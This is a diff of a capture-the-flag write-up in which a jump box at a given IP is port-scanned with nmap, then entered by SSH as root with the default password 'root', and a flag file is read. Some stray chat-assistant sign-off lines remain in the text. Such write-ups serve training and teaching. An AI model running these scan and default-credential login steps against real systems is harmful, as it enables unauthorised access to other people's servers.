@@ -1723,38 +1723,80 @@ A misconfigured DevOps jump box used by a third-party contractor was left expose
 
 ### Exploitation Steps
 
-1. **Attempted SSH login on the target IP and custom port** using the root account:
+1. Port Scan
+	
+	```bash
+	nmap -Pn 68.183.205.254 -p 34788
+```
+
+**Output:**
+
+```
+PORT      STATE SERVICE
+34788/tcp open  unknown
+```
+
+**Observation:**  
+Port `34788` is open. Likely running SSH based on challenge hints.
+
+---
+
+## 🚪 Exploitation
+
+### ✅ Step 2: Attempt SSH with Default Credentials
+
+**Command:**
+
+```bash
+ssh root@68.183.205.254 -p 34788
+```
+
+**Password Used:** `root`  
+**Result:** Successfully logged in as root.
+
+---
+
+## 📁 Post-Exploitation
+
+### ✅ Step 3: Locate and Read Flag
+
+**Command:**
+
+```bash
+ls
+cat flag.txt
+```
+
+**Output:**
+
+```
+h4kit{root_login_still_alive_98afb5c58968}
+```
+
+---
+
+## 📝 Summary
+
+- The SSH service was running on a custom port (`34788`).
     
-    ```bash
-    ssh root@68.183.205.254 -p 34788
-    ```
+- The root account allowed login with default credentials: `root:root`.
     
-2. **When prompted for a password**, entered the commonly used default: `root`.
+- This confirms poor security hygiene and supports the negligence claim.
     
-3. **Login was successful**, confirming that root login was enabled and default credentials had not been changed.
-    
-4. Once logged in, **listed the contents of the root home directory**:
-    
-    ```bash
-    ls
-    ```
-    
-5. Found a file named `flag.txt` and **read its contents**:
-    
-    ```bash
-    cat flag.txt
-    ```
-    
-6. **Retrieved the flag**:
-    
-    ```
-    h4kit{root_login_still_alive_98afb5c58968}
-    ```
+- You successfully accessed the server and retrieved the flag.
     
 
 ---
 
-Let me know if you'd like this compiled into a file or added to a longer report.
+## 🏁 Flag
+
+```
+h4kit{root_login_still_alive_98afb5c58968}
+```
+
+---
+
+Let me know if you want this exported to a `.md`, `.txt`, or PDF for submission or recordkeeping. Ready to log your next challenge when you are!
 
 ### 🚩Flag Captured: `h4kit{root_login_still_alive_98afb5c58968}`
 
